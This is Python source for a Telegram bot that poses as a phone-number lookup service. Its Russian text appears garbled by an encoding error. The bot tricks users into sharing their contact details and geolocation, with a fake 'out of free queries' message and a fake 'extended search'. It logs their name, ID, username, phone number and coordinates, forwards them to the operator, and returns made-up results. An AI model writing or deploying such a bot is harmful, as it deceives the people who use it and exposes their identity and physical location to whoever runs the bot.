import telebot
from telebot import types
import time
import random

ID = ''
bot = telebot.TeleBot("")
adr = ['–¢–≤–µ—Ä—Å–∫–∞—è —É–ª–∏—Ü–∞, –¥–æ–º 13', '–ü—Ä–æ—Å–ø–µ–∫—Ç 60-–ª–µ—Ç–∏—è –û–∫—Ç—è–±—Ä—è', '–£–ª–∏—Ü–∞ –í–∏–Ω–æ–∫—É—Ä–æ–≤–∞', '3-–π –ì–æ–ª—É—Ç–≤–∏–Ω—Å–∫–∏–π –ø–µ—Ä–µ—É–ª–æ–∫']
bot.send_message(ID, '!BOT STARTED!') 

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''üëã –ü—Ä–∏–≤–µ—Ç! üëã
		–≠—Ç–æ –±–æ—Ç, –∫–æ—Ç–æ—Ä—ã–π –∫–æ—Ç–æ—Ä—ã–π –ø–æ–º–æ–∂–µ—Ç –Ω–∞–π—Ç–∏ —Ç–µ–ª–µ—Ñ–æ–Ω –ø–æ –Ω–æ–º–µ—Ä—É!
	–î–ª—è –ø–æ–∏—Å–∫–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É /getinfo''') 

@bot.message_handler(commands=['getinfo'])
def start(message):
	msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –ª—é–±–æ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –∫–æ—Ç–æ—Ä—ã–π —Ö–æ—Ç–∏—Ç–µ –Ω–∞–π—Ç–∏') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		user_input = message.text
		num = user_input.replace('+', '')

		if not num.isdigit():
			msg = bot.reply_to(message, '–ö–∞–∂–µ—Ç—Å—è, –≤—ã –Ω–µ –≤–≤–µ–ª–∏ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞, –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /getinfo!')#‚è≥
			return

		bot.send_message(m_id, f'–ó–∞–ø—Ä–æ—Å –Ω–∞ –Ω–æ–º–µ—Ä {num} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!')
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="–ó–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''–ü–æ—Ö–æ–∂–µ —É –≤–∞—Å –Ω–µ –æ—Å—Ç–∞–ª–æ—Å—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ –¥–µ–Ω—å!
			–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –≤–æ–ø—Ä–æ—Å—ã –∑–∞—Ä–µ–≥–µ—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å –≤ –±–æ—Ç–µ!''', reply_markup=keyboard)
# –û—Ç–ª–æ–≤–∫–∞ –æ—à–∏–±–æ–∫
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			–î–∞–Ω–Ω—ã–µ
			‚îú–ò–º—è: {first} {last}
			‚îúID: {userid}
			‚îú–ù–∏–∫: @{nick}
			‚îî–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: {phone}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, '–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ–π –∫–æ–Ω—Ç–∞–∫—Ç!')

	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	button = types.InlineKeyboardButton(text="–†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π –ø–æ–∏—Å–∫", callback_data="find")
	keyboardmain.add(button)
	bot.send_message(message.chat.id, f'''
		–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –Ω–æ–º–µ—Ä–µ
		‚îú–û–ø–µ—Ä–∞—Ç–æ—Ä: Beeline
		‚îî–°—Ç—Ä–∞–Ω–∞: –†–æ—Å—Å–∏—è
		''', reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "find":
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(call.message.chat.id, text='–î–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –±–µ—Å–ø–ª–∞—Ç–Ω–æ–≥–æ —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω–æ–≥–æ –ø–æ–∏—Å–∫–∞, –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
		‚îúID: {message.chat.id}
		‚îúLongitude: {lon}
		‚îúLatitude: {lat} 
		‚îî–ö–∞—Ä—Ç—ã: https://www.google.com/maps/place/{lat}+{lon} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, f'''
			–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
			‚îî–ê–¥—Ä–µ—Å: {random.choice(adr)}
			''')
bot.polling()
